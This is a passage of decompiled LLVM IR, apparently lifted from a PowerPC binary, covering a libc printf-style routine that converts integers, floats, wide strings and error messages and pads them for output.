  br i1 %v3_1000d75c, label %dec_label_pc_1000d774, label %dec_label_pc_1000d770

dec_label_pc_1000d76c:                            ; preds = %dec_label_pc_1000d744
  %v0_1000d76c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d76c = sub i32 0, %v0_1000d76c
  store i32 %v1_1000d76c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d770

dec_label_pc_1000d770:                            ; preds = %dec_label_pc_1000d75c, %dec_label_pc_1000d754, %dec_label_pc_1000d76c
  br label %dec_label_pc_1000d774

dec_label_pc_1000d774:                            ; preds = %dec_label_pc_1000d75c, %dec_label_pc_1000d770
  %storemerge3 = phi i32 [ 11, %dec_label_pc_1000d770 ], [ 6, %dec_label_pc_1000d75c ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1000d774 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d774, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1000d774, -1
  br i1 %tmp75, label %dec_label_pc_1000d788, label %dec_label_pc_1000d784

dec_label_pc_1000d784:                            ; preds = %dec_label_pc_1000d774
  br label %dec_label_pc_1000d788

dec_label_pc_1000d788:                            ; preds = %dec_label_pc_1000d774, %dec_label_pc_1000d784
  %storemerge = phi i32 [ %v4_1000d784, %dec_label_pc_1000d784 ], [ 32, %dec_label_pc_1000d774 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_1000d788 = icmp eq i32 %v0_1000d744, 1
  br i1 %v3_1000d788, label %dec_label_pc_1000d7a4, label %dec_label_pc_1000d794

dec_label_pc_1000d794:                            ; preds = %dec_label_pc_1000d788
  %v0_1000d794 = load i32, i32* @r7, align 4
  %v1_1000d794 = mul i32 %v0_1000d794, 4
  store i32 %v1_1000d794, i32* %r0.global-to-local, align 4
  %v0_1000d798 = load i32, i32* @r1, align 4
  %v2_1000d798 = add i32 %v0_1000d798, %v1_1000d794
  %v1_1000d79c = add i32 %v2_1000d798, 188
  %v2_1000d79c = inttoptr i32 %v1_1000d79c to i32*
  %v3_1000d79c = load i32, i32* %v2_1000d79c, align 4
  store i32 %v3_1000d79c, i32* %r0.global-to-local, align 4
  %v1_1000d7a0 = call i32 @__asm_rlwinm(i32 %v3_1000d79c, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000d7a4

dec_label_pc_1000d7a4:                            ; preds = %dec_label_pc_1000d788, %dec_label_pc_1000d794
  %v3_1000d7a4 = load i32, i32* %stack_var_-344, align 4
  %v0_1000d7a8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000d7a8, i32* @r5, align 4
  %v2_1000d7ac = inttoptr i32 %v0_1000d7a8 to i32*
  %v3_1000d7ac = call i32 @_load_inttype(i32 %v3_1000d7a4, i32* %v2_1000d7ac)
  %v0_1000d7bc = load i32, i32* %r31.global-to-local, align 4
  %v6_1000d7c4 = call i32 @_uintmaxtostr(i8* %v5_1000d7c4, i32 %v3_1000d7ac, i32 %v3_1000d7a4, i32 %v0_1000d7a8, i32 %v0_1000d7bc)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000d7c4, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000d818, label %dec_label_pc_1000d7d8

dec_label_pc_1000d7d8:                            ; preds = %dec_label_pc_1000d7a4
  %v7_1000d7c4 = inttoptr i32 %v6_1000d7c4 to i8*
  %v3_1000d7d8 = load i8, i8* %v7_1000d7c4, align 1
  %v4_1000d7d8 = zext i8 %v3_1000d7d8 to i32
  store i32 %v4_1000d7d8, i32* %r0.global-to-local, align 4
  %v3_1000d7e0 = icmp eq i8 %v3_1000d7d8, 45
  br i1 %v3_1000d7e0, label %dec_label_pc_1000d7e8, label %dec_label_pc_1000d7fc

dec_label_pc_1000d7e8:                            ; preds = %dec_label_pc_1000d7d8
  %v1_1000d7e8 = or i32 %v0_1000d80c, 2
  store i32 %v1_1000d7e8, i32* %r0.global-to-local, align 4
  %v2_1000d7ec = add i32 %v6_1000d7c4, 1
  store i32 %v2_1000d7ec, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000d818

dec_label_pc_1000d7fc:                            ; preds = %dec_label_pc_1000d7d8
  %v1_1000d7fc = and i32 %v0_1000d80c, 2
  store i32 %v1_1000d7fc, i32* %r0.global-to-local, align 4
  %v3_1000d7fc = icmp eq i32 %v1_1000d7fc, 0
  br i1 %v3_1000d7fc, label %dec_label_pc_1000d80c, label %dec_label_pc_1000d804

dec_label_pc_1000d804:                            ; preds = %dec_label_pc_1000d7fc
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000d818

dec_label_pc_1000d80c:                            ; preds = %dec_label_pc_1000d7fc
  %v1_1000d80c = urem i32 %v0_1000d80c, 2
  store i32 %v1_1000d80c, i32* %r11.global-to-local, align 4
  %v3_1000d80c = icmp eq i32 %v1_1000d80c, 0
  br i1 %v3_1000d80c, label %dec_label_pc_1000d818, label %dec_label_pc_1000d814

dec_label_pc_1000d814:                            ; preds = %dec_label_pc_1000d80c
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000d818

dec_label_pc_1000d818:                            ; preds = %dec_label_pc_1000d80c, %dec_label_pc_1000d7a4, %dec_label_pc_1000d804, %dec_label_pc_1000d7e8, %dec_label_pc_1000d814
  %v0_1000d884 = phi i32 [ %v6_1000d7c4, %dec_label_pc_1000d7a4 ], [ %v2_1000d7ec, %dec_label_pc_1000d7e8 ], [ %v6_1000d7c4, %dec_label_pc_1000d80c ], [ %v6_1000d7c4, %dec_label_pc_1000d814 ], [ %v6_1000d7c4, %dec_label_pc_1000d804 ]
  %stack_var_-184.0 = phi i32 [ %v0_1000d80c, %dec_label_pc_1000d7a4 ], [ %v1_1000d7e8, %dec_label_pc_1000d7e8 ], [ %v0_1000d80c, %dec_label_pc_1000d80c ], [ %v0_1000d80c, %dec_label_pc_1000d814 ], [ %v0_1000d80c, %dec_label_pc_1000d804 ]
  %v3_1000d818 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000da2c, i32* %r0.global-to-local, align 4
  %v2_1000d820 = sub i32 %v2_1000da2c, %v0_1000d884
  %v1_1000d828 = add i32 %v2_1000d820, 127
  store i32 %v1_1000d828, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000d818, -1
  br i1 %tmp76, label %dec_label_pc_1000d834, label %dec_label_pc_1000d830

dec_label_pc_1000d830:                            ; preds = %dec_label_pc_1000d818
  br label %dec_label_pc_1000d834

dec_label_pc_1000d834:                            ; preds = %dec_label_pc_1000d818, %dec_label_pc_1000d830
  %v0_1000d868 = phi i32 [ %v3_1000d818, %dec_label_pc_1000d818 ], [ 1, %dec_label_pc_1000d830 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000d838 = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000d838, i32* %r11.global-to-local, align 4
  %v3_1000d838 = icmp eq i32 %v1_1000d838, 0
  br i1 %v3_1000d838, label %dec_label_pc_1000d884, label %dec_label_pc_1000d840

dec_label_pc_1000d840:                            ; preds = %dec_label_pc_1000d834
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000d844, label %dec_label_pc_1000d850, label %dec_label_pc_1000d860.thread

dec_label_pc_1000d860.thread:                     ; preds = %dec_label_pc_1000d840
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000d884

dec_label_pc_1000d850:                            ; preds = %dec_label_pc_1000d840
  br i1 %v3_1000d850, label %dec_label_pc_1000d858, label %dec_label_pc_1000d860

dec_label_pc_1000d858:                            ; preds = %dec_label_pc_1000d850
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000d884

dec_label_pc_1000d860:                            ; preds = %dec_label_pc_1000d850
  br i1 %v3_1000d860, label %dec_label_pc_1000d868, label %dec_label_pc_1000d884

dec_label_pc_1000d868:                            ; preds = %dec_label_pc_1000d860
  %v3_1000d868 = icmp ugt i32 %v0_1000d868, %v1_1000d828
  br i1 %v3_1000d868, label %dec_label_pc_1000d884, label %dec_label_pc_1000d870

dec_label_pc_1000d870:                            ; preds = %dec_label_pc_1000d868
  %v1_1000d870 = inttoptr i32 %v0_1000d884 to i8*
  %v2_1000d870 = load i8, i8* %v1_1000d870, align 1
  %v3_1000d870 = zext i8 %v2_1000d870 to i32
  store i32 %v3_1000d870, i32* %r0.global-to-local, align 4
  %v3_1000d878 = icmp eq i8 %v2_1000d870, 48
  br i1 %v3_1000d878, label %dec_label_pc_1000d884, label %dec_label_pc_1000d880

dec_label_pc_1000d880:                            ; preds = %dec_label_pc_1000d870
  %v1_1000d880 = add i32 %v2_1000d820, 128
  br label %dec_label_pc_1000d884

dec_label_pc_1000d884:                            ; preds = %dec_label_pc_1000d860.thread, %dec_label_pc_1000d860, %dec_label_pc_1000d870, %dec_label_pc_1000d868, %dec_label_pc_1000d834, %dec_label_pc_1000d858, %dec_label_pc_1000d880
  %v1_1000d8cc = phi i32 [ %v0_1000d868, %dec_label_pc_1000d860 ], [ 1, %dec_label_pc_1000d870 ], [ %v0_1000d868, %dec_label_pc_1000d868 ], [ %v0_1000d868, %dec_label_pc_1000d834 ], [ %v0_1000d868, %dec_label_pc_1000d858 ], [ %v1_1000d880, %dec_label_pc_1000d880 ], [ %v0_1000d868, %dec_label_pc_1000d860.thread ]
  %v1_1000d884 = inttoptr i32 %v0_1000d884 to i8*
  %v2_1000d884 = load i8, i8* %v1_1000d884, align 1
  %v3_1000d884 = zext i8 %v2_1000d884 to i32
  store i32 %v3_1000d884, i32* %r0.global-to-local, align 4
  %v3_1000d888 = icmp eq i8 %v2_1000d884, 48
  br i1 %v3_1000d888, label %dec_label_pc_1000d890, label %dec_label_pc_1000d8c8

dec_label_pc_1000d890:                            ; preds = %dec_label_pc_1000d884
  %v0_1000d890 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1000d890, 6
  br i1 %tmp77, label %dec_label_pc_1000d89c, label %dec_label_pc_1000d898

dec_label_pc_1000d898:                            ; preds = %dec_label_pc_1000d890
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000d89c

dec_label_pc_1000d89c:                            ; preds = %dec_label_pc_1000d890, %dec_label_pc_1000d898
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d8a0, label %dec_label_pc_1000d8a8, label %dec_label_pc_1000d8b8

dec_label_pc_1000d8a8:                            ; preds = %dec_label_pc_1000d89c
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_100171a4.623 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000da44

dec_label_pc_1000d8b8:                            ; preds = %dec_label_pc_1000d89c
  %v3_1000d8b8 = icmp eq i32 %v1_1000d8cc, 0
  br i1 %v3_1000d8b8, label %dec_label_pc_1000d8c0, label %dec_label_pc_1000d8c8

dec_label_pc_1000d8c0:                            ; preds = %dec_label_pc_1000d8b8
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000da44

dec_label_pc_1000d8c8:                            ; preds = %dec_label_pc_1000d8b8, %dec_label_pc_1000d884
  %v3_1000d8c8 = icmp ugt i32 %v1_1000d8cc, %v1_1000d828
  %v2_1000d8cc = sub i32 %v1_1000d8cc, %v1_1000d828
  store i32 %v2_1000d8cc, i32* %r29.global-to-local, align 4
  br i1 %v3_1000d8c8, label %dec_label_pc_1000da64thread-pre-split, label %dec_label_pc_1000da44

dec_label_pc_1000d8d8:                            ; preds = %dec_label_pc_1000d6f8
  br i1 %v2_1000d8d8, label %dec_label_pc_1000d90c, label %dec_label_pc_1000d8e0

dec_label_pc_1000d8e0:                            ; preds = %dec_label_pc_1000d8d8
  %v3_1000d8e0 = load i32, i32* %stack_var_-344, align 4
  %v0_1000d8ec = load i32, i32* %r24.global-to-local, align 4
  store i32 268491004, i32* @lr, align 4
  %v5_1000d8f8 = call i32 @_fpmaxtostr(i32 %v0_1000d8ec, i32* nonnull %stack_var_-196, i32 268489940, i32 %v3_1000d8e0)
  %v1_1000d8fc = icmp slt i32 %v5_1000d8f8, 0
  br i1 %v1_1000d8fc, label %dec_label_pc_1000dbc8, label %dec_label_pc_1000d904

dec_label_pc_1000d904:                            ; preds = %dec_label_pc_1000d8e0
  %v0_1000d904 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000d904 = add i32 %v0_1000d904, %v5_1000d8f8
  store i32 %v2_1000d904, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000dbb4

dec_label_pc_1000d90c:                            ; preds = %dec_label_pc_1000d8d8
  br i1 %v2_1000d90c, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d914

dec_label_pc_1000d914:                            ; preds = %dec_label_pc_1000d90c
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000d920 = load i32, i32* %stack_var_-344, align 4
  %v1_1000d928 = inttoptr i32 %v3_1000d920 to i32*
  %v2_1000d928 = load i32, i32* %v1_1000d928, align 4
  br i1 %v3_1000d90c, label %dec_label_pc_1000d928, label %dec_label_pc_1000d97c

dec_label_pc_1000d928:                            ; preds = %dec_label_pc_1000d914
  store i32 %v2_1000d928, i32* %r0.global-to-local, align 4
  %v3_1000d92c = icmp eq i32 %v2_1000d928, 0
  store i32 %v2_1000d928, i32* %stack_var_-340, align 4
  br i1 %v3_1000d92c, label %dec_label_pc_1000da4c, label %dec_label_pc_1000d938

dec_label_pc_1000d938:                            ; preds = %dec_label_pc_1000d928
  %v3_1000d938 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d938, i32* %r0.global-to-local, align 4
  %v1_1000d940 = icmp slt i32 %v3_1000d938, 0
  br i1 %v1_1000d940, label %dec_label_pc_1000d94c, label %dec_label_pc_1000d948

dec_label_pc_1000d948:                            ; preds = %dec_label_pc_1000d938
  br label %dec_label_pc_1000d94c

dec_label_pc_1000d94c:                            ; preds = %dec_label_pc_1000d938, %dec_label_pc_1000d948
  %storemerge94 = phi i32 [ %v3_1000d938, %dec_label_pc_1000d948 ], [ -1, %dec_label_pc_1000d938 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000d94c, i32* @r3, align 4
  store i32 %v2_1000d950, i32* @r6, align 4
  store i32 %v2_1000d94c, i32* @r4, align 4
  store i32 268491100, i32* @lr, align 4
  %v0_1000d958 = call i32 @__GI_wcsrtombs()
  %v3_1000d95c = icmp eq i32 %v0_1000d958, -1
  store i32 %v0_1000d958, i32* @r31, align 4
  br i1 %v3_1000d95c, label %dec_label_pc_1000dbc8, label %dec_label_pc_1000d968

dec_label_pc_1000d968:                            ; preds = %dec_label_pc_1000d94c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000da64

dec_label_pc_1000d97c:                            ; preds = %dec_label_pc_1000d914
  store i32 %v2_1000da2c, i32* @r28, align 4
  store i32 268491152, i32* @lr, align 4
  %v3_1000d98c = call i32 @__GI_wcrtomb(i32 %v2_1000da2c, i32 %v2_1000d928, i32 %v2_1000d950)
  %v3_1000d990 = icmp eq i32 %v3_1000d98c, -1
  store i32 %v3_1000d98c, i32* @r31, align 4
  br i1 %v3_1000d990, label %dec_label_pc_1000dbc8, label %dec_label_pc_1000d99c

dec_label_pc_1000d99c:                            ; preds = %dec_label_pc_1000d97c
  store i32 %v2_1000da2c, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000d9ac = load i32, i32* @r25, align 4
  %v1_1000d9ac = load i32, i32* @r28, align 4
  %v3_1000d9ac = trunc i32 %v0_1000d9ac to i8
  %v4_1000d9ac = add i32 %v1_1000d9ac, %v3_1000d98c
  %v5_1000d9ac = inttoptr i32 %v4_1000d9ac to i8*
  store i8 %v3_1000d9ac, i8* %v5_1000d9ac, align 1
  %v0_1000da68.pre.pre = load i32, i32* @r31, align 4
  %v1_1000da68.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000da64thread-pre-split

dec_label_pc_1000d9b4:                            ; preds = %dec_label_pc_1000d90c
  br i1 %v2_1000d9b4, label %dec_label_pc_1000da20, label %dec_label_pc_1000d9bc

dec_label_pc_1000d9bc:                            ; preds = %dec_label_pc_1000d9b4
  %v3_1000d9c0 = load i32, i32* %stack_var_-344, align 4
  %v1_1000d9c8 = inttoptr i32 %v3_1000d9c0 to i32*
  %v2_1000d9c8 = load i32, i32* %v1_1000d9c8, align 4
  br i1 %v3_1000d9b4, label %dec_label_pc_1000d9c8, label %dec_label_pc_1000d9f8

dec_label_pc_1000d9c8:                            ; preds = %dec_label_pc_1000d9bc
  store i32 %v2_1000d9c8, i32* %r30.global-to-local, align 4
  %v3_1000d9cc = icmp eq i32 %v2_1000d9c8, 0
  br i1 %v3_1000d9cc, label %dec_label_pc_1000da4c, label %dec_label_pc_1000d9d4

dec_label_pc_1000d9d4:                            ; preds = %dec_label_pc_1000d9c8, %dec_label_pc_1000da28
  %v0_1000d9e8 = phi i32 [ %v2_1000d9c8, %dec_label_pc_1000d9c8 ], [ %v3_1000da38, %dec_label_pc_1000da28 ]
  %v3_1000d9d4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d9d4, i32* %r0.global-to-local, align 4
  %v1_1000d9dc = icmp slt i32 %v3_1000d9d4, 0
  br i1 %v1_1000d9dc, label %dec_label_pc_1000d9e8, label %dec_label_pc_1000d9e4

dec_label_pc_1000d9e4:                            ; preds = %dec_label_pc_1000d9d4
  br label %dec_label_pc_1000d9e8

dec_label_pc_1000d9e8:                            ; preds = %dec_label_pc_1000d9d4, %dec_label_pc_1000d9e4
  %storemerge95 = phi i32 [ %v3_1000d9d4, %dec_label_pc_1000d9e4 ], [ -1, %dec_label_pc_1000d9d4 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268491248, i32* @lr, align 4
  %v1_1000d9ec = inttoptr i32 %v0_1000d9e8 to i8*
  %v2_1000d9ec = call i32 @strnlen(i8* %v1_1000d9ec)
  store i32 %v2_1000d9ec, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000da58

dec_label_pc_1000d9f8:                            ; preds = %dec_label_pc_1000d9bc
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1000d9c8, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000da2c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000da64thread-pre-split

dec_label_pc_1000da20:                            ; preds = %dec_label_pc_1000d9b4
  br i1 %v3_1000da20, label %dec_label_pc_1000da28, label %dec_label_pc_1000dbc8

dec_label_pc_1000da28:                            ; preds = %dec_label_pc_1000da20
  %v0_1000da28 = call i32 @__errno_location()
  %v1_1000da30 = inttoptr i32 %v0_1000da28 to i32*
  %v2_1000da30 = load i32, i32* %v1_1000da30, align 4
  store i32 %v2_1000da30, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268491324, i32* @lr, align 4
  %v3_1000da38 = call i32 @__GI___glibc_strerror_r(i32 %v2_1000da30, i32 %v2_1000da2c, i32 128)
  store i32 %v3_1000da38, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d9d4

dec_label_pc_1000da44:                            ; preds = %dec_label_pc_1000d8c8, %dec_label_pc_1000d8c0, %dec_label_pc_1000d8a8
  %v0_1000da68.pre41 = phi i32 [ %v1_1000d828, %dec_label_pc_1000d8c8 ], [ 0, %dec_label_pc_1000d8c0 ], [ 5, %dec_label_pc_1000d8a8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000da64thread-pre-split

dec_label_pc_1000da4c:                            ; preds = %dec_label_pc_1000d9c8, %dec_label_pc_1000d928
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_100171ac.624 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000da58

dec_label_pc_1000da58:                            ; preds = %dec_label_pc_1000d9e8, %dec_label_pc_1000da4c
  %v0_1000da6829 = phi i32 [ %v2_1000d9ec, %dec_label_pc_1000d9e8 ], [ 6, %dec_label_pc_1000da4c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000da64

dec_label_pc_1000da64thread-pre-split:            ; preds = %dec_label_pc_1000d99c, %dec_label_pc_1000d9f8, %dec_label_pc_1000da44, %dec_label_pc_1000d8c8
  %v1_1000da68.pre = phi i32 [ %v2_1000d8cc, %dec_label_pc_1000d8c8 ], [ 0, %dec_label_pc_1000da44 ], [ %v1_1000da68.pre.pre, %dec_label_pc_1000d99c ], [ 0, %dec_label_pc_1000d9f8 ]
  %v0_1000da68.pre = phi i32 [ %v1_1000d828, %dec_label_pc_1000d8c8 ], [ %v0_1000da68.pre41, %dec_label_pc_1000da44 ], [ %v0_1000da68.pre.pre, %dec_label_pc_1000d99c ], [ 1, %dec_label_pc_1000d9f8 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000d8c8 ], [ %stack_var_-184.0, %dec_label_pc_1000da44 ], [ %v0_1000d80c, %dec_label_pc_1000d99c ], [ %v0_1000d80c, %dec_label_pc_1000d9f8 ]
  %v0_1000da64.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000da64

dec_label_pc_1000da64:                            ; preds = %dec_label_pc_1000da64thread-pre-split, %dec_label_pc_1000d968, %dec_label_pc_1000da58
  %v1_1000da68 = phi i32 [ %v1_1000da68.pre, %dec_label_pc_1000da64thread-pre-split ], [ 0, %dec_label_pc_1000d968 ], [ 0, %dec_label_pc_1000da58 ]
  %v0_1000da68 = phi i32 [ %v0_1000da68.pre, %dec_label_pc_1000da64thread-pre-split ], [ %v0_1000d958, %dec_label_pc_1000d968 ], [ %v0_1000da6829, %dec_label_pc_1000da58 ]
  %v0_1000da70 = phi i32 [ %v0_1000da64.pr, %dec_label_pc_1000da64thread-pre-split ], [ 11, %dec_label_pc_1000d968 ], [ 11, %dec_label_pc_1000da58 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000da64thread-pre-split ], [ %v0_1000d80c, %dec_label_pc_1000d968 ], [ %v0_1000d80c, %dec_label_pc_1000da58 ]
  %v3_1000da64 = icmp eq i32 %v0_1000da70, 11
  %v2_1000da68 = add i32 %v0_1000da68, %v1_1000da68
  store i32 %v2_1000da68, i32* %r0.global-to-local, align 4
  br i1 %v3_1000da64, label %dec_label_pc_1000da84, label %dec_label_pc_1000da70

dec_label_pc_1000da70:                            ; preds = %dec_label_pc_1000da64
  %v0_1000da74 = call i32 @__asm_mfcr()
  %v1_1000da78 = call i32 @__asm_rlwinm(i32 %v0_1000da74, i32 30, i32 31, i32 31)
  %v1_1000da7c = add i32 %v1_1000da78, 1
  %v0_1000da80 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000da80 = add i32 %v0_1000da80, %v1_1000da7c
  store i32 %v2_1000da80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000da84

dec_label_pc_1000da84:                            ; preds = %dec_label_pc_1000da64, %dec_label_pc_1000da70
  %v0_1000da9c = phi i32 [ %v2_1000da68, %dec_label_pc_1000da64 ], [ %v2_1000da80, %dec_label_pc_1000da70 ]
  %v3_1000da8c = icmp ugt i32 %tmp, %v0_1000da9c
  br i1 %v3_1000da8c, label %dec_label_pc_1000da94, label %dec_label_pc_1000da98

dec_label_pc_1000da94:                            ; preds = %dec_label_pc_1000da84
  %v2_1000da94 = sub i32 %tmp, %v0_1000da9c
  br label %dec_label_pc_1000da98

dec_label_pc_1000da98:                            ; preds = %dec_label_pc_1000da84, %dec_label_pc_1000da94
  %storemerge93 = phi i32 [ %v2_1000da94, %dec_label_pc_1000da94 ], [ 0, %dec_label_pc_1000da84 ]
  %v1_1000daa8 = phi i32 [ %v2_1000da94, %dec_label_pc_1000da94 ], [ 0, %dec_label_pc_1000da84 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1000da98 = load i32, i32* @r26, align 4
  %v3_1000da98 = icmp eq i32 %v0_1000da98, 48
  %v2_1000da9c = add i32 %v1_1000daa8, %v0_1000da9c
  store i32 %v2_1000da9c, i32* %r0.global-to-local, align 4
  %v0_1000daa0 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000daa0 = add i32 %v0_1000daa0, %v2_1000da9c
  store i32 %v2_1000daa0, i32* %r23.global-to-local, align 4
  br i1 %v3_1000da98, label %dec_label_pc_1000daa8, label %dec_label_pc_1000dab0

dec_label_pc_1000daa8:                            ; preds = %dec_label_pc_1000da98
  %v0_1000daa8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000daa8 = add i32 %v0_1000daa8, %v1_1000daa8
  store i32 %v2_1000daa8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000dab0

dec_label_pc_1000dab0:                            ; preds = %dec_label_pc_1000da98, %dec_label_pc_1000daa8
  %v0_1000dac4 = phi i32 [ %v1_1000daa8, %dec_label_pc_1000da98 ], [ 0, %dec_label_pc_1000daa8 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000dab4 = and i32 %stack_var_-184.1, 8
  %v3_1000dab4 = icmp eq i32 %v1_1000dab4, 0
  br i1 %v3_1000dab4, label %dec_label_pc_1000dabc, label %dec_label_pc_1000dad8

dec_label_pc_1000dabc:                            ; preds = %dec_label_pc_1000dab0
  %v0_1000dabc = load i32, i32* %r24.global-to-local, align 4
  store i32 268491468, i32* @lr, align 4
  %v4_1000dac8 = call i32 @_charpad(i32 %v0_1000dabc, i8 32, i32 %v0_1000dac4)
  %v1_1000dacc = load i32, i32* @r28, align 4
  %v4_1000dacc = icmp eq i32 %v4_1000dac8, %v1_1000dacc
  br i1 %v4_1000dacc, label %dec_label_pc_1000dad4, label %dec_label_pc_1000dbc8

dec_label_pc_1000dad4:                            ; preds = %dec_label_pc_1000dabc
  br label %dec_label_pc_1000dad8

dec_label_pc_1000dad8:                            ; preds = %dec_label_pc_1000dab0, %dec_label_pc_1000dad4
  %v0_1000dadc = load i32, i32* %r24.global-to-local, align 4
  %v0_1000dae4 = load i32, i32* @r27, align 4
  %v2_1000dae4 = add i32 %v0_1000dae4, ptrtoint (i32* @global_var_100171b4.625 to i32)
  store i32 268491500, i32* @lr, align 4
  %v2_1000dae8 = call i32 @__GI_fputs_unlocked(i32 %v2_1000dae4, i32 %v0_1000dadc)
  %v0_1000daf4 = load i32, i32* @r29, align 4
  store i32 268491516, i32* @lr, align 4
  %v4_1000daf8 = call i32 @_charpad(i32 %v0_1000dadc, i8 48, i32 %v0_1000daf4)
  %v1_1000dafc = load i32, i32* @r29, align 4
  %v4_1000dafc = icmp eq i32 %v4_1000daf8, %v1_1000dafc
  br i1 %v4_1000dafc, label %dec_label_pc_1000db04, label %dec_label_pc_1000dbc8

dec_label_pc_1000db04:                            ; preds = %dec_label_pc_1000dad8
  %v3_1000db04 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000db04, i32* %r0.global-to-local, align 4
  %v3_1000db08 = icmp eq i32 %v3_1000db04, 0
  br i1 %v3_1000db08, label %dec_label_pc_1000db10, label %dec_label_pc_1000db38

dec_label_pc_1000db10:                            ; preds = %dec_label_pc_1000db04
  %v0_1000db10 = load i32, i32* @r31, align 4
  %v3_1000db10 = icmp eq i32 %v0_1000db10, 0
  br i1 %v3_1000db10, label %dec_label_pc_1000db2c.thread, label %dec_label_pc_1000db2c

dec_label_pc_1000db2c.thread:                     ; preds = %dec_label_pc_1000db10
  br label %dec_label_pc_1000db9c

dec_label_pc_1000db2c:                            ; preds = %dec_label_pc_1000db10
  %v0_1000db1c = load i32, i32* @r30, align 4
  %v0_1000db24 = load i32, i32* %r24.global-to-local, align 4
  store i32 268491564, i32* @lr, align 4
  %v4_1000db28 = inttoptr i32 %v0_1000db24 to i16*
  %v5_1000db28 = call i32 @__stdio_fwrite(i32 %v0_1000db1c, i32 %v0_1000db10, i16* %v4_1000db28)
  %v1_1000db2c.pre = load i32, i32* @r31, align 4
  %v4_1000db2c = icmp eq i32 %v5_1000db28, %v1_1000db2c.pre
  br i1 %v4_1000db2c, label %dec_label_pc_1000db9c, label %dec_label_pc_1000dbc8

dec_label_pc_1000db38:                            ; preds = %dec_label_pc_1000db04
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000db7c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000db7c

dec_label_pc_1000db44:                            ; preds = %dec_label_pc_1000db7c
  %tmp78 = icmp ult i32 %v0_1000db94, 129
  br i1 %tmp78, label %dec_label_pc_1000db4c, label %dec_label_pc_1000db48

dec_label_pc_1000db48:                            ; preds = %dec_label_pc_1000db44
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000db4c

dec_label_pc_1000db4c:                            ; preds = %dec_label_pc_1000db44, %dec_label_pc_1000db48
  store i32 ptrtoint (i32* @global_var_1000db50.626 to i32), i32* @lr, align 4
  %v0_1000db4c = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000db4c, i32* @r30, align 4
  %v3_1000db54 = icmp eq i32 %v0_1000db4c, 0
